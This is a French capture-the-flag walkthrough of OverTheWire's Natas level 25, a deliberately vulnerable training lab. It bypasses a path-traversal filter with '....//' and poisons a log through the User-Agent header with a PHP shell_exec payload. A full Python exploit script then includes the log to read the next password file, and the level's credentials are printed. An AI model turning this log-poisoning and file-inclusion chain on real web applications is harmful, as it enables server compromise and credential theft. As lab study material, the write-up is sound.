## Connexion (username=natas25 password=UJEF5OAHF1eW3lqkpdCDM7ow4syzh4oo)
```
http://natas25.natas.labs.overthewire.org/
```

## Recherche du mot de passe
2 filtres à bypass.

Le premier enlève les ```../``` en paramètre passé à l'URL.

Je pourrai donc envoyé ```....//``` ce qui donnera ```../```

Le second par contre est plus problématique puisqu'il filtre le mot ```natas_webpass```

Donc impossible d'y accéder comme suit:
http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//etc/natas_webpass/natas26

On a sinon un logger:
```php
function logRequest($message){
    $log="[". date("d.m.Y H::i:s",time()) ."]";
    $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
    $log=$log . " \"" . $message ."\"\n"; 
    $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
    fwrite($fd,$log);
    fclose($fd);
}
```
En allant lire mon fichier avec mon php sid. j'ai remarqué que le HTTP_USER_AGENT utilisé était le mien ...
Ce qui veut dire que ce champ est injectable. Je n'ai qu'à mettre une exécution php directement dans ce champ pour cat le fichier natas26 ...

On peut le faire par burp suite ou en python

```python
import requests

url = "http://natas25.natas.labs.overthewire.org/"
header = {
    "Authorization": "Basic bmF0YXMyNTpVSkVGNU9BSEYxZVczbHFrcGRDRE03b3c0c3l6aDRvbw=="
}
with requests.Session() as session:
    session.headers.update(header)
    response = session.get(url)
    sid = response.cookies.get_dict()["PHPSESSID"]
    header["Cookie"] = "PHPSESSID=" + sid
    header["User-Agent"] = '<?php echo shell_exec("cat /etc/natas_webpass/natas26"); ?>'
    session.headers.update(header)

    url += f"?lang=....//....//natas25/logs/natas25_{sid}.log"
    response = session.get(url)
    print(response.text)
```
## Prochain mot de passe
```
3CApdpjqI4UYPxY8mHQWUdFPGH9BoUTT
```